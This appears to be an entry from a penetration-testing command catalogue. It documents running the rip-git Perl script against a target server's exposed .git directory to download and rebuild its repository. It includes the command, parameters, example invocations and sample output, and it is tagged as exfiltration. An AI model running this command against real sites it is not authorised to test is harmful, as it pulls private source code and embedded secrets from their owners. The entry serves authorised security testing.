---
id: 7ac10d63-71bb-4c07-841f-04d5b4e6db3f
name: perl-run-rip-git-on-target
type: command
executor: bash
data: perl rip-git.pl -v -u "$_TARGET_URL/.git/"
output: null
created_at: '2023-04-06T03:55:59.981769+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - perl
  - rip-git
  - exfiltration
verified: true
validated: true
---

# perl-run-rip-git-on-target

## Command

```bash
perl rip-git.pl -v -u "$_TARGET_URL/.git/"
```

## Description

Executes the rip-git Perl script to download and reconstruct a Git repository from an exposed .git directory on a target web server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Base URL of the target web application (e.g., http://example.com) | Yes |
| -v | Verbose output for progress tracking | No |
| -u | URL path to the .git directory | Yes |

## Examples

### Basic Usage

```bash
perl rip-git.pl -v -u "http://example.com/.git/"
```

### Advanced Usage

```bash
perl rip-git.pl -v -u "https://staging.example.com/.git/" -o ./recovered-repo
```

## Expected Output

[*] DVCS Ripper v0.1
[*] Fetching refs from http://example.com/.git/
[*] Downloading objects...
[*] Repository ripped successfully to ./example.com.git

## Related

- [[procedures/Recover-Git-Repository-from-Exposed-Dot-Git-Directory]]
- [[tools/DVCS-Ripper]]
